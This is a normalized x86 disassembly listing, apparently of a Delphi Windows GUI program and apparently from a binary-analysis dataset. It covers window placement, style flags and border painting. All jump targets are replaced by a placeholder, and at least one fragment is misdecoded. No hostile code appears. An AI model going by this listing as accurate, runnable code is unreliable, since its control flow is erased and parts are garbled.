movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4188a0
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_418a2c
sub_456288
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_456358
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_450a20
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_4562e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45634c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456353
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4034ac
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_40595c
sub_456364
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44eea8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_45641c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4189b0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418854
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4034ac
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_45647c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_456572
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4034ac
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456579
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_418a0c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4189b0
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_456588
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_45647c
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4565b4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_466768
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_45647c
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_45647c
mov edx eax
mov eax esi
call sub_46a3d4
sub_4565f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_456640
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_455cfc
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44fac4
sub_456688
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45670c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_452d84
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_456ace
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_452d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_456688
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_456ae5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45670c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4508bc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_456b24
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_451740
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44f1bc
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_456b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451960
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_456b9c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor ecx ecx
push ebp
push sub_456ccb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_452d84
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456cd2
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_452d48
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_456cd2
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034ac
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034ac
jmp r-xdata
sub_456d68
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_450a20
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_450a20
sub_456dac
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_450a20
sub_456e1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_456eac
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_457112
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_440198
call sub_440278
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_440198
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_440890
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
